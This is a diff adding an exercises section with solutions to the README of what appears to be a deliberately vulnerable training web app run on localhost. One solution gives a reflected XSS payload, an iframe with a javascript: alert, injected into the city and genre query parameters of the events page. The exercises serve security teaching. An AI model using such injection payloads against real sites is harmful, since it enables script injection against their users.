@@ -38,6 +38,20 @@ The frontend runs on `http://localhost:5173/` and the backend on `http://localho
 
 TODO
 
+
+## Exercises
+
+### Group 0
+#### Exercise 1
+
+Solution: Create an account by click on the Account symbol (top right) -> Button "Create a new Account" -> "Create Account"
+
+### Group 3
+#### Exercise 1
+
+Solution: `http://localhost:5173/events?city=Hannover&genre=<iframe src="javascript:alert(`xss`)">` or `http://localhost:5173/events?city=<iframe src="javascript:alert(`xss`)">`
+
+
 ## Structure
 
 ### Database
